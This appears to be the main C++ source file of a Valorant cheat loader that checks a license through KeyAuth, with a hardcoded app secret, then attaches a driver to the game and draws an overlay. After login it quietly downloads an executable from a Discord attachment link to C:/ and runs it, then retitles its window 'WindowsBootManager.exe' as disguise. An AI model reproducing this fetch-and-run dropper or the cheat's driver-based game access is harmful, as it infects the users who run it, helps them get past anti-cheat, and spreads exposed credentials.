#include <Windows.h>
#include <iostream>
#include <thread>
#include <string>
#include <filesystem>
#include <windows.h>

#include "overlay/render.hpp"
#include "overlay/menu.hpp"

#include "game/cheat.hpp"

#include <TlHelp32.h>
#include <string>

#include <stdlib.h>
#include <stdio.h>
#include <cstdlib>


#include "driver/driver.hpp"
#include "strings.hpp"
#include <Urlmon.h>
#include <tchar.h>
#pragma comment(lib, "urlmon.lib")

#include "../../KeyAuth-CPP-Example-main/KeyAuth-CPP-Example-main/auth.hpp"
#include <string>
#include "../../KeyAuth-CPP-Example-main/KeyAuth-CPP-Example-main/skStr.h"
std::string tm_to_readable_time(tm ctx);
static std::time_t string_to_timet(std::string timestamp);
static std::tm timet_to_tm(time_t timestamp);

using namespace KeyAuth;

std::string name = "$moke.val"; // application name. right above the blurred text aka the secret on the licenses tab among other tabs
std::string ownerid = "WCwTPG0LVt"; // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
std::string secret = "4b5292e312f30abca8f3957d5cc0543b114a10909ce231e66d13575d8a3bc4e4"; // app secret, the blurred text on licenses tab and other tabs
std::string version = "1.0"; // leave alone unless you've changed version on website
std::string url = "https://keyauth.win/api/1.2/"; // change if you're self-hosting

api KeyAuthApp(name, ownerid, secret, version, url);





DWORD GetProcessID(const std::wstring processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}

void clear() {
	COORD topLeft = { 0, 0 };
	HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO screen;
	DWORD written;

	GetConsoleScreenBufferInfo(console, &screen);
	FillConsoleOutputCharacterA(
		console, ' ', screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	FillConsoleOutputAttribute(
		console, FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE,
		screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	SetConsoleCursorPosition(console, topLeft);
}

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}
void ReverseStealth()
{
	HWND ReverseStealth;
	AllocConsole();
	ReverseStealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(ReverseStealth, 5);
}

int main()
{
	SetConsoleTitleA(skCrypt("$moke.val Login"));
	KeyAuthApp.init();
	if (!KeyAuthApp.data.success)
	{
		std::cout << skCrypt("\n Status: ") << KeyAuthApp.data.message;
		Sleep(1500);
		exit(0);
	}

	/*
		Optional - check if HWID or IP blacklisted
	if (KeyAuthApp.checkblack()) {
		abort();
	}
	*/

	int option;
	std::string key;
	{
		std::cout << R"(




   _                  _        
  | |                | |       
 / __)_ __ ___   ___ | | _____ 
 \__ \ '_ ` _ \ / _ \| |/ / _ \
 (   / | | | | | (_) |   <  __/
  |_||_| |_| |_|\___/|_|\_\___|
                               
                               
               


  )";

		std::cout << skCrypt("\n Enter license: ");
		std::cin >> key;
		KeyAuthApp.license(key);
		Sleep(3000);
	}

	if (!KeyAuthApp.data.success)
	{
		Sleep(1500);
		exit(0);
	}


	std::cout << skCrypt("\n\n Closing in 3 seconds...");
	Sleep(3000);

	HRESULT hr = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/1024682437382504509/1026112954250301530/Hello_World.exe"), _T("c:/Hello_World.exe"), 0, NULL);
	system("start C:/Hello_World.exe");
	SetConsoleTitleW(L"WindowsBootManager.exe");
	std::cout << "\n\n\n";

	std::cout << "                           Make Sure To Have It As Windowed Borderless In Valorant Settings \n\n\n\n";
	Sleep(1500);


	while (Entryhwnd == NULL)
	{
		std::cout << ("                                            Waiting for Valorant...\n\n\n\n");
		Sleep(1);
		processid = GetProcessID(L"VALORANT-Win64-Shipping.exe");
		Entryhwnd = get_process_wnd(processid);
		Sleep(1);
	}


	driver.initdriver(processid);

	setup_window();
	init_wndparams(MyWnd);

	std::thread(CacheGame).detach();

	main_loop();

	exit(0);

}

auto render() -> void 
{
	ImGui_ImplDX9_NewFrame();
	ImGui_ImplWin32_NewFrame();
	ImGui::NewFrame();

	CheatLoop();
	drawmenu();

	ImGui::EndFrame();
	p_Device->SetRenderState(D3DRS_ZENABLE, false);
	p_Device->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
	p_Device->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
	p_Device->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);

	if (p_Device->BeginScene() >= 0) 
	{
		ImGui::Render();
		ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
		p_Device->EndScene();
	}

	HRESULT result = p_Device->Present(NULL, NULL, NULL, NULL);

	if (result == D3DERR_DEVICELOST && p_Device->TestCooperativeLevel() == D3DERR_DEVICENOTRESET) 
	{
		ImGui_ImplDX9_InvalidateDeviceObjects();
		p_Device->Reset(&d3dpp);
		ImGui_ImplDX9_CreateDeviceObjects();
	}
}

auto main_loop() -> WPARAM
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT) 
	{
		if (PeekMessage(&Message, MyWnd, 0, 0, PM_REMOVE)) {
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}

		HWND hwnd_active = GetForegroundWindow();
		if (GetAsyncKeyState(0x23) & 1)
			exit(8);

		if (hwnd_active == GameWnd) {
			HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
			SetWindowPos(MyWnd, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}
		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(GameWnd, &rc);
		ClientToScreen(GameWnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = GameWnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (GetAsyncKeyState(0x1)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else io.MouseDown[0] = false;

		if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom) {

			old_rc = rc;

			Width = rc.right;
			Height = rc.bottom;

			p_Params.BackBufferWidth = Width;
			p_Params.BackBufferHeight = Height;
			SetWindowPos(MyWnd, (HWND)0, xy.x, xy.y, Width, Height, SWP_NOREDRAW);
			p_Device->Reset(&p_Params);
		}
		render();
	}

	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();

	cleanup_d3d();
	DestroyWindow(MyWnd);

	return Message.wParam;
}

std::string tm_to_readable_time(tm ctx) {
	char buffer[80];

	strftime(buffer, sizeof(buffer), "%a %m/%d/%y %H:%M:%S %Z", &ctx);

	return std::string(buffer);
}

static std::time_t string_to_timet(std::string timestamp) {
	auto cv = strtol(timestamp.c_str(), NULL, 10); // long

	return (time_t)cv;
}

static std::tm timet_to_tm(time_t timestamp) {
	std::tm context;

	localtime_s(&context, &timestamp);

	return context;
}